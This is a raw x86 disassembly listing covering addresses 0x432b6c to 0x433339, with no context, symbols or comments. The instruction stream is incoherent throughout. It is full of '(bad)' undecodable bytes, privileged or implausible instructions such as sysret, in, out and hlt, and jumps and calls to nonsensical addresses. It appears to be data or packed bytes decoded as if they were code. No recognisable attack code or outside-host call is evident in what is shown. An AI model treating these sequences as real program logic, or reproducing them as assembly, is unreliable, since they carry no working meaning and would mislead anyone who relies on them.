  432b6c:	(bad)  
  432b6d:	call   0x342971
  432b72:	mov    bh,0xdb
  432b74:	cld    
  432b75:	or     BYTE PTR [ebp+0x45],bl
  432b78:	(bad)  
  432b79:	call   0xff7d2809
  432b7e:	add    al,BYTE PTR [ebp+0x37]
  432b81:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  432b87:	jne    0x432b89
  432b89:	(bad)  
  432b8a:	cmp    edi,esp
  432b8c:	jne    0x432bbf
  432b8e:	mov    edi,edi
  432b90:	or     BYTE PTR [ebx-0x307f0b49],cl
  432b96:	pop    ds
  432b97:	into   
  432b98:	je     0x432b5b
  432b9a:	mov    ebx,DWORD PTR [esi]
  432b9c:	or     BYTE PTR [ebp-0x49],al
  432b9f:	mov    esp,DWORD PTR [esi-0x77]
  432ba2:	mov    esi,0x2451f0c
  432ba7:	mov    eax,DWORD PTR [eax]
  432ba9:	or     al,0x66
  432bab:	sar    bl,0x3b
  432bae:	xor    esi,DWORD PTR [ebp+0x66]
  432bb1:	xor    ecx,edi
  432bb3:	pop    edi
  432bb4:	adc    bl,BYTE PTR [ebx+0x7e]
  432bb7:	ret    0xff
  432bba:	cld    
  432bbb:	inc    ebp
  432bbc:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  432bc2:	cld    
  432bc3:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  432bca:	push   0xffffff83
  432bcc:	pop    edi
  432bcd:	or     BYTE PTR [ebp+0x53],dh
  432bd0:	xorps  xmm1,xmm2
  432bd3:	test   BYTE PTR [eax+eax*1],bh
  432bd6:	add    BYTE PTR [eax],al
  432bd8:	adc    eax,eax
  432bda:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  432be2:	jmp    DWORD PTR [eax]
  432be4:	ror    al,0x5e
  432be7:	inc    ebp
  432be8:	leave  
  432be9:	xor    ecx,DWORD PTR [eax]
  432beb:	and    DWORD PTR [ebx-0x3ec30708],ecx
  432bf1:	add    ah,al
  432bf3:	xor    edi,edi
  432bf5:	xor    DWORD PTR [ebx],0x66003302
  432bfb:	mov    DWORD PTR [ebp-0xc],ecx
  432bfe:	pcmpgtw mm0,mm0
  432c01:	add    dl,ah
  432c03:	leave  
  432c04:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  432c08:	push   eax
  432c09:	dec    ebp
  432c0a:	mov    esi,DWORD PTR [ebx-0x75]
  432c0d:	lea    ebp,[eax-0x7c00ff02]
  432c13:	xor    eax,DWORD PTR [eax]
  432c15:	sysret 
  432c17:	dec    ebp
  432c18:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432c1f:	push   WORD PTR [ecx+0x8]
  432c23:	jne    0x432be6
  432c25:	ud0    ecx,DWORD PTR [ecx]
  432c28:	mov    eax,edx
  432c2a:	lods   al,BYTE PTR ds:[esi]
  432c2b:	add    BYTE PTR [eax],al
  432c2d:	data16 (bad) 
  432c2f:	iret   
  432c30:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432c37:	cli    
  432c38:	inc    ebp
  432c39:	cmp    al,0x8d
  432c3b:	add    BYTE PTR [esi+0x2d],ah
  432c3e:	inc    ebp
  432c3f:	pop    ebp
  432c40:	lea    ecx,[edi]
  432c42:	mov    dl,bh
  432c44:	add    BYTE PTR [edi],cl
  432c46:	mov    DWORD PTR [eax+eax*8],edi
  432c49:	mov    ebx,0x3b87
  432c4e:	add    BYTE PTR [ebx],ch
  432c50:	inc    ebp
  432c51:	data16 (bad) 
  432c53:	clc    
  432c54:	int3   
  432c55:	cmp    eax,DWORD PTR [eax]
  432c57:	je     0x432be2
  432c59:	push   0xffffffc8
  432c5b:	pop    edi
  432c5c:	xchg   DWORD PTR [ebp+0x0],eax
  432c5f:	data16 add BYTE PTR [ebp+0x45],cl
  432c63:	lea    cx,[ebp+0x10]
  432c67:	jb     0x432c69
  432c69:	jmp    0x432bf4
  432c6b:	call   eax
  432c6d:	clc    
  432c6e:	xchg   DWORD PTR [edi+0x1],edi
  432c71:	mov    eax,DWORD PTR [eax]
  432c73:	or     BYTE PTR [ebp-0x49],al
  432c76:	lea    eax,[eax+0x74003154]
  432c7c:	push   edi
  432c7d:	inc    edx
  432c7e:	jge    0x432c7f
  432c80:	mov    DWORD PTR [edi],ecx
  432c82:	fdiv   DWORD PTR [edi-0x6]
  432c85:	inc    DWORD PTR [eax]
  432c87:	xor    edx,DWORD PTR [eax+0x5f]
  432c8a:	xchg   DWORD PTR [ebx+0x1],ebx
  432c8d:	ret    0x0
  432c90:	xor    BYTE PTR [ebp-0x51],cl
  432c93:	cmp    edi,0xf0ff89fe
  432c99:	data16 ror al,0x84
  432c9d:	rol    BYTE PTR [eax],0x3b
  432ca0:	add    al,dh
  432ca2:	dec    eax
  432ca3:	xchg   esp,eax
  432ca4:	push   ebx
  432ca5:	jmp    0x432c32
  432ca7:	push   ebp
  432ca8:	add    esp,ebp
  432caa:	add    ebp,esp
  432cac:	mov    edx,DWORD PTR [edi+0x24]
  432caf:	clc    
  432cb0:	dec    esi
  432cb1:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432cb7:	cmp    BYTE PTR [ebx],al
  432cb9:	jne    0x432c44
  432cbb:	xor    esp,eax
  432cbd:	jmp    0x462e40
  432cc2:	add    ebp,DWORD PTR [ecx+ecx*4]
  432cc5:	jne    0x432cbb
  432cc7:	call   0xffcd2a21
  432ccc:	clc    
  432ccd:	xchg   edi,eax
  432cce:	sti    
  432ccf:	add    DWORD PTR [ebx],eax
  432cd1:	add    BYTE PTR [ebp+0x47],bl
  432cd4:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432cda:	pop    ebp
  432cdb:	mov    DWORD PTR [esi-0x48],esi
  432cde:	jmp    0x432d27
  432ce0:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432ce6:	(bad)  
  432ce8:	cmp    al,0x0
  432cea:	cmp    eax,DWORD PTR [ebp+0x18]
  432ced:	lea    ebx,[ebp-0x56]
  432cf0:	jle    0x432cf2
  432cf2:	jae    0x432c7d
  432cf4:	mov    eax,esp
  432cf6:	call   0xb900:0x8b005587
  432cfd:	inc    ebp
  432cfe:	push   ebp
  432cff:	lea    ecx,[ebp-0x27ff4f12]
  432d05:	mov    eax,edi
  432d07:	int3   
  432d08:	push   ebp
  432d09:	xchg   edi,eax
  432d0b:	add    esp,ebp
  432d0d:	add    BYTE PTR [eax],al
  432d0f:	inc    ebp
  432d10:	add    BYTE PTR [ebp+0x8b3255],cl
  432d16:	cld    
  432d17:	mov    DWORD PTR [edx],edi
  432d19:	aam    0x75
  432d1b:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432d21:	mov    DWORD PTR [ebx-0x50],edx
  432d24:	test   BYTE PTR [ebp-0x1],0xe8
  432d28:	mov    eax,DWORD PTR [eax]
  432d2a:	hlt    
  432d2b:	add    al,al
  432d2d:	mov    eax,DWORD PTR ds:0x890045a8
  432d33:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432d39:	inc    DWORD PTR [eax*2+0xf75854d]
  432d40:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432d46:	call   0x72998a87
  432d4b:	je     0x432dab
  432d4d:	js     0x432dae
  432d4f:	lock ret 0x7e
  432d53:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432d59:	mov    edi,edi
  432d5b:	sbb    al,bl
  432d5d:	clc    
  432d5e:	add    BYTE PTR [ebp-0x73],bh
  432d61:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432d67:	ror    BYTE PTR [eax],1
  432d69:	dec    ebp
  432d6a:	xchg   ebp,eax
  432d6b:	mov    edi,edi
  432d6d:	in     al,0x8b
  432d6f:	jge    0x432cfa
  432d71:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432d77:	clc    
  432d78:	pop    esi
  432d79:	fist   DWORD PTR [ebp+0x5d398b5d]
  432d7f:	clc    
  432d80:	add    al,0x6e
  432d82:	mov    eax,DWORD PTR [ebx]
  432d84:	mov    BYTE PTR [ebp+0x0],dl
  432d87:	mov    edx,DWORD PTR [ebx-0x20]
  432d8a:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  432d90:	add    eax,0x3b3b73
  432d95:	adc    al,0x89
  432d97:	pop    eax
  432d98:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432d9c:	ret    0xf08
  432d9f:	cmp    al,0x2
  432da1:	mov    edx,eax
  432da3:	cld    
  432da4:	add    BYTE PTR [ebp+0x66],dl
  432da7:	add    eax,ebx
  432da9:	add    esp,eax
  432dab:	sub    eax,eax
  432dad:	or     BYTE PTR [ecx-0x77f474bb],cl
  432db3:	add    BYTE PTR [eax],al
  432db5:	mov    DWORD PTR [ebx-0x24],ebx
  432db8:	push   edi
  432db9:	push   ebp
  432dba:	clc    
  432dbb:	add    DWORD PTR [esi+0x1b0100],0x45
  432dc2:	out    0xff,eax
  432dc4:	add    edx,DWORD PTR [eax]
  432dc6:	jmp    0x432db0
  432dc8:	cmp    ch,0x46
  432dcb:	(bad)  
  432dcc:	jmp    0x40c8b61e
  432dd1:	je     0x432d5d
  432dd3:	mov    eax,DWORD PTR [eax-0x10c78104]
  432dd9:	inc    ebp
  432dda:	add    BYTE PTR [ebx-0x770375],al
  432de0:	add    ah,ch
  432de2:	add    edx,esp
  432de4:	pop    edi
  432de5:	pop    ebp
  432de6:	push   ebp
  432de7:	inc    ebx
  432de8:	in     al,dx
  432de9:	pop    ebp
  432dea:	in     al,dx
  432deb:	cmp    edx,DWORD PTR [edi-0x8]
  432dee:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  432df5:	add    al,0x47
  432df7:	push   ebp
  432df8:	mov    esp,ebp
  432dfa:	in     al,0x45
  432dfc:	dec    ebp
  432dfd:	push   esi
  432dfe:	test   DWORD PTR [eax+0xfb010f],esi
  432e04:	add    BYTE PTR [eax+0xc018b],dh
  432e0a:	leave  
  432e0b:	inc    ebp
  432e0c:	test   al,ch
  432e0e:	add    dh,bh
  432e10:	add    bh,bh
  432e12:	dec    ebp
  432e13:	push   cs
  432e14:	mov    DWORD PTR [ecx],eax
  432e16:	hlt    
  432e17:	push   es
  432e18:	dec    ebp
  432e19:	leave  
  432e1a:	mov    DWORD PTR [eax],ecx
  432e1c:	clc    
  432e1d:	cmovge eax,ecx
  432e20:	mov    ecx,0x85c2f0
  432e26:	clc    
  432e27:	pop    DWORD PTR [ebp+0x1]
  432e2a:	push   ebx
  432e2b:	add    BYTE PTR [ebp-0x15],bh
  432e2e:	push   esi
  432e2f:	xor    eax,0x898a45
  432e34:	cld    
  432e35:	add    al,BYTE PTR [ebp+0x0]
  432e38:	xor    esp,DWORD PTR [esi-0x64]
  432e3b:	add    DWORD PTR [esi+0x78308c1],edi
  432e41:	add    ah,BYTE PTR [ebp-0x49]
  432e44:	int    0xbb
  432e46:	mov    ecx,DWORD PTR [esi+0xc]
  432e49:	add    dh,al
  432e4b:	cmp    ecx,ebx
  432e4d:	jne    0x432e17
  432e4f:	xor    ecx,DWORD PTR [ebp+0x66]
  432e52:	jmp    0xca2e58
  432e57:	add    DWORD PTR [ebp+0x0],eax
  432e5a:	mov    eax,ebx
  432e5c:	or     al,0x8b
  432e5e:	(bad)  
  432e5f:	mov    ecx,esi
  432e61:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  432e68:	mov    eax,edi
  432e6a:	or     BYTE PTR [edx],cl
  432e6c:	shl    cl,cl
  432e6e:	icebp  
  432e6f:	add    BYTE PTR [ebp+0x38],0x8b
  432e73:	or     BYTE PTR [edx+eax*2],cl
  432e76:	(bad)  
  432e77:	or     cl,dh
  432e79:	stc    
  432e7a:	shl    DWORD PTR [ebp-0x30],0xc6
  432e7e:	xor    al,0x0
  432e80:	inc    ebp
  432e81:	xchg   BYTE PTR [ebx],al
  432e83:	add    esp,edi
  432e85:	add    BYTE PTR [ebp-0x39],cl
  432e88:	mov    al,bl
  432e8a:	test   DWORD PTR [ebx+0x1c348375],ecx
  432e90:	sub    al,0xbf
  432e92:	jmp    0x432e19
  432e94:	mov    edi,eax
  432e96:	lock jge 0x432e8a
  432e99:	lea    esi,[edx-0x74bad5ff]
  432e9f:	mov    ebp,esp
  432ea1:	or     cl,dh
  432ea3:	leave  
  432ea4:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  432eab:	dec    ebp
  432eac:	dec    ebp
  432ead:	test   DWORD PTR [ebx],eax
  432eaf:	paddb  mm6,mm0
  432eb2:	add    DWORD PTR [eax],eax
  432eb4:	dec    ebp
  432eb5:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  432ebb:	mov    esi,DWORD PTR [edx]
  432ebd:	or     al,0x2b
  432ebf:	dec    ebp
  432ec0:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432ec6:	mov    esp,edi
  432ec8:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432ecf:	mov    DWORD PTR [ebx],ebp
  432ed1:	call   0xc76b801
  432ed6:	mov    DWORD PTR [ebp+0x10],ecx
  432ed9:	(bad)  
  432eda:	push   0x8b85ff10
  432edf:	clc    
  432ee0:	or     al,0x54
  432ee2:	(bad)  
  432ee3:	push   ecx
  432ee4:	retf   
  432ee5:	mov    ebx,0xff4d8dc8
  432eea:	mov    DWORD PTR [ebp+0x8],eax
  432eed:	xor    eax,DWORD PTR [ebp-0x75]
  432ef0:	cmp    ebp,DWORD PTR [ebx]
  432ef2:	lsl    ebx,WORD PTR [edi-0x8]
  432ef6:	call   DWORD PTR [ebx-0x741bff75]
  432efc:	(bad)  
  432efd:	or     al,0x5b
  432eff:	dec    ebp
  432f00:	or     BYTE PTR [ebx],dh
  432f02:	inc    ebp
  432f03:	xor    esi,DWORD PTR ds:0x708088d
  432f09:	in     eax,0x9b
  432f0b:	add    BYTE PTR [edx],dh
  432f0d:	inc    ebp
  432f0e:	pop    edi
  432f0f:	xor    eax,edx
  432f11:	test   DWORD PTR [eax],0x81108b8b
  432f17:	dec    ebp
  432f18:	sub    al,0x33
  432f1a:	add    BYTE PTR [ebx],dh
  432f1c:	push   esi
  432f1d:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432f23:	mov    edi,eax
  432f25:	or     BYTE PTR [ebp+0x45],al
  432f28:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432f2e:	xor    ecx,ecx
  432f30:	pushf  
  432f31:	push   es
  432f32:	mov    DWORD PTR [esi-0x4],0xf8178538
  432f39:	dec    ebp
  432f3a:	inc    ebp
  432f3b:	cmp    BYTE PTR [ecx],0x54
  432f3e:	pushf  
  432f3f:	gs (bad) 
  432f41:	shl    esp,1
  432f43:	dec    ebp
  432f44:	xchg   BYTE PTR [eax-0x3dbaab08],al
  432f4a:	shr    ecx,1
  432f4c:	xlat   BYTE PTR ds:[ebx]
  432f4d:	rol    bh,cl
  432f4f:	mov    edx,esp
  432f51:	or     BYTE PTR [ebp+0x4588f84d],al
  432f57:	mov    ecx,DWORD PTR [eax]
  432f59:	or     BYTE PTR [eax],al
  432f5b:	push   ebp
  432f5c:	mov    edi,DWORD PTR [eax+0xfc728b]
  432f62:	dec    ebp
  432f63:	enter  0xceba,0x8
  432f67:	retf   0x1807
  432f6a:	ret    0x9b4d
  432f6d:	mov    esi,DWORD PTR [edx]
  432f6f:	or     al,0x33
  432f71:	into   
  432f72:	add    edx,esi
  432f74:	add    ecx,edx
  432f76:	bswap  eax
  432f78:	ror    esi,0x98
  432f7b:	dec    ebp
  432f7c:	add    cl,ch
  432f7e:	mov    edi,edi
  432f80:	hlt    
  432f81:	inc    esi
  432f83:	inc    ebp
  432f84:	ret    0x4533
  432f87:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  432f8d:	or     BYTE PTR [ebx],dh
  432f8f:	dec    ebp
  432f90:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  432f96:	jne    0xff8d2f5d
  432f9c:	inc    ebp
  432f9d:	inc    ebp
  432f9e:	mov    esi,DWORD PTR [ebx]
  432fa0:	clc    
  432fa1:	pop    esi
  432fa2:	ret    0xcaeb
  432fa5:	mov    eax,esi
  432fa7:	call   0x5204847a
  432fac:	dec    ebp
  432fad:	add    eax,0xf8728b
  432fb2:	adc    eax,0xce0ccac9
  432fb7:	push   ebp
  432fb8:	ret    0xc6ec
  432fbb:	in     al,dx
  432fbc:	call   0x33437cc5
  432fc1:	push   edi
  432fc2:	add    edi,eax
  432fc4:	xor    eax,eax
  432fc6:	jmp    0x43300d
  432fc8:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  432fce:	add    eax,edi
  432fd0:	shr    eax,cl
  432fd2:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  432fd8:	mov    esi,DWORD PTR [edx]
  432fda:	in     al,dx
  432fdb:	pushf  
  432fdc:	ret    0x84c7
  432fdf:	fcomp  DWORD PTR [ebx-0x7607cd7b]
  432fe5:	inc    ebp
  432fe6:	in     al,dx
  432fe7:	xor    DWORD PTR [ebp-0x64],eax
  432fea:	mov    eax,edi
  432fec:	cld    
  432fed:	fmul   st(2),st
  432fef:	sbb    dl,al
  432ff1:	jmp    0x9c3b:0x304d45c1
  432ff8:	jbe    0x432fc1
  432ffa:	mov    esp,eax
  432ffc:	clc    
  432ffd:	add    BYTE PTR [ebp+0x0],cl
  433000:	mov    ecx,ecx
  433002:	lea    eax,[ebp-0x5]
  433005:	mov    edi,edi
  433007:	call   0x51ce8451
  43300c:	hlt    
  43300d:	xor    eax,edx
  43300f:	mov    esi,0x9b7284
  433014:	xor    cl,dl
  433016:	mov    esi,eax
  433018:	hlt    
  433019:	into   
  43301a:	inc    ebp
  43301b:	scas   eax,DWORD PTR es:[edi]
  43301c:	mov    ebp,ecx
  43301e:	cld    
  43301f:	add    dl,cl
  433021:	add    dl,al
  433023:	inc    ebp
  433024:	shr    DWORD PTR [ebx],0x4d
  433027:	xor    edi,DWORD PTR [ebx]
  433029:	mov    DWORD PTR [edi],ecx
  43302b:	clc    
  43302c:	dec    esi
  43302d:	inc    ebp
  43302e:	dec    DWORD PTR [ebx-0x3d2b1775]
  433034:	ret    0xc6ca
  433037:	mov    BYTE PTR [ebp-0x32],0x53
  43303b:	scas   eax,DWORD PTR es:[edi]
  43303c:	inc    ebp
  43303d:	jmp    0x43306f
  43303f:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  433046:	pop    ebx
  433047:	xor    ecx,DWORD PTR [ebp+0x3]
  43304a:	mov    eax,DWORD PTR [ebx]
  43304c:	clc    
  43304d:	test   edx,ecx
  43304f:	mov    ecx,esi
  433051:	cld    
  433052:	call   0x8ab7759c
  433057:	xor    ecx,DWORD PTR [eax+0x4533f303]
  43305d:	add    ecx,DWORD PTR [ebx-0x4974072d]
  433063:	fdiv   QWORD PTR [ebx]
  433065:	retf   0xce89
  433068:	in     al,0xc1
  43306a:	inc    ebp
  43306b:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  433071:	into   
  433072:	mov    dh,0xc1
  433075:	call   0x8c1775fe
  43307a:	(bad)  
  43307b:	cld    
  43307c:	mov    ecx,DWORD PTR [ebp-0x14]
  43307f:	xor    eax,ecx
  433081:	lea    eax,[ebp+0x8]
  433084:	mov    esi,DWORD PTR [edx-0x4]
  433087:	add    dl,al
  433089:	inc    ebp
  43308a:	mov    esp,0x32d89b8b
  43308f:	dec    ebp
  433090:	mov    esi,DWORD PTR [ebx]
  433092:	cld    
  433093:	xor    eax,edx
  433095:	sub    esp,DWORD PTR [ebp-0x75]
  433098:	int    0xec
  43309a:	sub    ecx,eax
  43309c:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  4330a2:	mov    esi,esp
  4330a4:	call   0x34177e2d
  4330a9:	inc    DWORD PTR [ebx]
  4330ab:	mov    edi,DWORD PTR [ebx]
  4330ad:	cld    
  4330ae:	jne    0x4330fd
  4330b0:	mov    esi,DWORD PTR [ebx]
  4330b2:	aam    0x8d
  4330b4:	dec    ebp
  4330b5:	or     BYTE PTR [ebx],dh
  4330b7:	jb     0x4330bc
  4330b9:	add    BYTE PTR [edi+0x45],bl
  4330bc:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  4330c3:	xor    ebp,esp
  4330c5:	xor    eax,edi
  4330c7:	sub    edi,esp
  4330c9:	mov    eax,DWORD PTR [ebp+0x32c8f8f4]
  4330cf:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  4330d6:	inc    ebp
  4330d7:	xor    ecx,DWORD PTR [ecx+0x45891403]
  4330dd:	clc    
  4330de:	mov    eax,edi
  4330e0:	nop
  4330e1:	fadd   QWORD PTR [eax]
  4330e3:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  4330e9:	jmp    0x433074
  4330eb:	mov    eax,DWORD PTR [ecx]
  4330ed:	fadd   DWORD PTR [eax]
  4330ef:	inc    ebp
  4330f0:	or     DWORD PTR [ebx],esi
  4330f2:	dec    eax
  4330f3:	add    edx,DWORD PTR [ebx-0x2d]
  4330f6:	dec    ebp
  4330f7:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  4330fd:	inc    ebp
  4330fe:	push   esp
  4330ff:	mov    dl,BYTE PTR [ecx-0xd]
  433102:	xor    ecx,DWORD PTR [ebp-0x45]
  433105:	(bad)  
  433107:	rol    BYTE PTR [eax],0xc1
  43310a:	ret    
  43310b:	inc    ebp
  43310c:	inc    ebp
  43310d:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  433113:	xor    eax,ebx
  433115:	add    eax,DWORD PTR [ebp+0x23]
  433118:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  43311e:	cmp    edi,0xc
  433121:	dec    ebp
  433122:	inc    ebp
  433123:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433129:	inc    ebp
  43312a:	mov    esi,DWORD PTR [ebx]
  43312c:	clc    
  43312d:	lea    eax,[ebp+0x45725407]
  433133:	add    BYTE PTR [ebp+eax*2-0x75],dh
  433137:	xor    edi,DWORD PTR [eax]
  433139:	mov    ecx,0xff8b8d4d
  43313e:	push   esp
  43313f:	enter  0x4df7,0x23
  433143:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  433149:	mov    eax,DWORD PTR [ebx]
  43314b:	loopne 0x433138
  43314d:	ret    0xc68b
  433150:	push   esp
  433151:	enter  0x9745,0x8b
  433155:	inc    ebp
  433156:	cld    
  433157:	mov    eax,edi
  433159:	clc    
  43315a:	ret    
  43315b:	ret    0xc645
  43315e:	mov    esi,DWORD PTR [ebx]
  433160:	cld    
  433161:	pop    esi
  433162:	mov    ebx,0x83458bc3
  433168:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  43316c:	dec    ebp
  43316d:	xor    DWORD PTR [ebx],esi
  43316f:	pushf  
  433170:	add    edi,DWORD PTR [edx-0x7767a77]
  433176:	fcom   DWORD PTR [ebp+0x45]
  433179:	mov    esi,DWORD PTR [ebx]
  43317b:	adc    al,0x9c
  43317d:	inc    ebp
  43317e:	(bad)  
  43317f:	mov    ebx,eax
  433181:	adc    al,0x85
  433183:	cmp    al,0x1
  433186:	inc    ebp
  433187:	add    BYTE PTR ds:0xe98b9c4d,bh
  43318d:	mov    eax,DWORD PTR [ebx]
  43318f:	nop
  433190:	add    BYTE PTR [eax],al
  433192:	inc    ebp
  433193:	mov    esi,DWORD PTR [ebx]
  433195:	add    eax,DWORD PTR [ebx]
  433197:	cmp    al,0x89
  433199:	mov    esp,esi
  43319b:	clc    
  43319c:	inc    ebp
  43319d:	inc    ebp
  43319e:	add    edx,DWORD PTR [esi+0xc]
  4331a1:	mov    edi,0x7ff0845
  4331a6:	in     al,dx
  4331a7:	(bad)  
  4331a8:	jne    0x433145
  4331aa:	mov    esi,DWORD PTR [edx]
  4331ac:	clc    
  4331ad:	add    ebp,DWORD PTR [esi]
  4331af:	mov    edi,edi
  4331b1:	in     al,dx
  4331b2:	mov    DWORD PTR [ebp-0x10],eax
  4331b5:	xor    eax,DWORD PTR [ebp+0x3]
  4331b8:	cmp    DWORD PTR [ecx+0x458bf49c],ecx
  4331be:	fmul   DWORD PTR [ebx-0x173caf39]
  4331c4:	lea    ecx,[ecx+0x45e8d4bc]
  4331ca:	clc    
  4331cb:	mov    edi,edi
  4331cd:	cmp    BYTE PTR [ebp+0x4d],al
  4331d0:	test   DWORD PTR [eax+0x74],ecx
  4331d3:	inc    ecx
  4331d4:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  4331da:	ret    
  4331db:	inc    eax
  4331dc:	dec    DWORD PTR [ebx+0x4945f8f0]
  4331e2:	push   eax
  4331e3:	dec    eax
  4331e4:	test   al,0xd0
  4331e6:	dec    eax
  4331e8:	mov    eax,DWORD PTR [ebp-0x14]
  4331eb:	mov    eax,DWORD PTR [ebp+0x38]
  4331ee:	mov    eax,ecx
  4331f0:	fadd   DWORD PTR [ebx]
  4331f2:	dec    ebp
  4331f3:	inc    eax
  4331f4:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  4331fa:	inc    ebp
  4331fb:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  433201:	fadd   QWORD PTR [ebx]
  433203:	inc    ebp
  433204:	or     al,0x33
  433206:	dec    ebp
  433207:	add    edi,DWORD PTR [ebx]
  433209:	mov    DWORD PTR [edx-0x28],esi
  43320c:	mov    eax,DWORD PTR [ebp-0x10]
  43320f:	mov    eax,DWORD PTR [eax+0x10]
  433212:	mov    eax,edi
  433214:	lock ret 
  433216:	inc    ecx
  433217:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  43321d:	fsubr  st,st(5)
  43321f:	test   DWORD PTR [eax],eax
  433221:	clc    
  433222:	push   0x45
  433224:	(bad)  
  433225:	cmp    al,0xec
  433227:	pushf  
  433228:	inc    ebp
  433229:	(bad)  
  43322a:	push   eax
  43322b:	fsub   DWORD PTR [eax-0x7b]
  43322e:	(bad)  
  43322f:	clc    
  433230:	mov    eax,0xf8008584
  433235:	mov    eax,DWORD PTR [ebp-0x4]
  433238:	mov    edi,0x4585c3cc
  43323e:	clc    
  43323f:	mov    eax,DWORD PTR [ebp+0x14]
  433242:	xor    eax,DWORD PTR [ebp-0x64]
  433245:	mov    edi,eax
  433247:	in     al,dx
  433248:	les    esi,FWORD PTR [ebp-0x7b]
  43324b:	mov    edi,eax
  43324d:	or     al,0x4d
  43324f:	dec    ebp
  433250:	mov    eax,ebp
  433252:	in     al,0xf2
  433254:	dec    ebp
  433255:	dec    DWORD PTR [ecx+0x4dc7e045]
  43325b:	fmul   DWORD PTR [ecx+0x4df8f085]
  433261:	inc    ebp
  433262:	mov    DWORD PTR [ebx],esi
  433264:	fadd   QWORD PTR [ebx]
  433266:	dec    ebp
  433267:	push   eax
  433268:	xor    eax,DWORD PTR [ebp+0x3]
  43326b:	push   eax
  43326c:	mov    DWORD PTR [eax+ebx*8],ebx
  43326f:	push   esi
  433271:	mov    eax,DWORD PTR [eax]
  433273:	lock cmp eax,0xf84e85c0
  433279:	inc    ebp
  43327a:	test   BYTE PTR [ebx],dh
  43327c:	add    DWORD PTR [ebx],eax
  43327e:	add    BYTE PTR [eax+0x4d],dl
  433281:	jne    0x4332b6
  433283:	lea    ecx,[ebx-0x7617fc44]
  433289:	div    ah
  43328b:	inc    DWORD PTR [ebp+0x45]
  43328e:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  433294:	jb     0x433221
  433296:	add    BYTE PTR [eax*2-0x17ba743f],cl
  43329d:	mov    ecx,DWORD PTR [ebp-0x10]
  4332a0:	xor    ecx,DWORD PTR [ebp+0x3]
  4332a3:	mov    edi,DWORD PTR [ebx]
  4332a5:	adc    BYTE PTR [ebp+0x41],dh
  4332a8:	mov    ecx,DWORD PTR [ebx-0x37382704]
  4332ae:	ret    
  4332af:	push   ss
  4332b0:	push   0x45
  4332b2:	lea    ecx,[ebx+0x4de80cb0]
  4332b8:	sti    
  4332b9:	add    edi,edi
  4332bb:	or     BYTE PTR [ebp+0x4d],al
  4332be:	mov    ebp,DWORD PTR [ebx]
  4332c0:	xor    ebp,ecx
  4332c2:	mov    al,BYTE PTR [edx]
  4332c4:	add    eax,0xc7200
  4332c9:	jne    0x433318
  4332cb:	lea    esi,[ebx]
  4332cd:	mov    al,0xf
  4332cf:	call   0xf2994
  4332d4:	shl    DWORD PTR [ecx],0x84
  4332d7:	pushf  
  4332d8:	add    DWORD PTR [ecx+0x4545d000],ecx
  4332de:	mov    esi,DWORD PTR [edx]
  4332e0:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  4332e7:	test   DWORD PTR [eax],eax
  4332e9:	clc    
  4332ea:	dec    ebp
  4332eb:	inc    ebp
  4332ec:	xor    edi,DWORD PTR [edi+ecx*1]
  4332ef:	pushf  
  4332f0:	ror    BYTE PTR [ebp+0x4dc1d0cb],0x84
  4332f7:	lea    eax,[ecx]
  4332f9:	int3   
  4332fa:	add    BYTE PTR [ebp+0x45],cl
  4332fd:	lea    ecx,[ebx-0x75b2cc38]
  433303:	lea    eax,ds:0x4d72c4
  433309:	mov    ecx,DWORD PTR [ebp-0x4]
  43330c:	xor    ecx,edi
  43330e:	bswap  ebx
  433310:	ror    BYTE PTR [ebp-0x35],0xe9
  433314:	rol    DWORD PTR [ecx],0x84
  433317:	add    BYTE PTR [ecx],al
  433319:	xor    eax,DWORD PTR [eax]
  43331b:	pushf  
  43331c:	inc    ebp
  43331d:	jnp    0x8a436720
  433323:	mov    eax,DWORD PTR ds:0xcf72e8
  433329:	lock dec ebp
  43332b:	retf   
  43332c:	xor    ecx,DWORD PTR [ebp+0xf]
  43332f:	mov    eax,eax
  433331:	fmul   st,st(3)
  433333:	test   ecx,0x19b8484
  433339:	xor    al,BYTE PTR [eax]
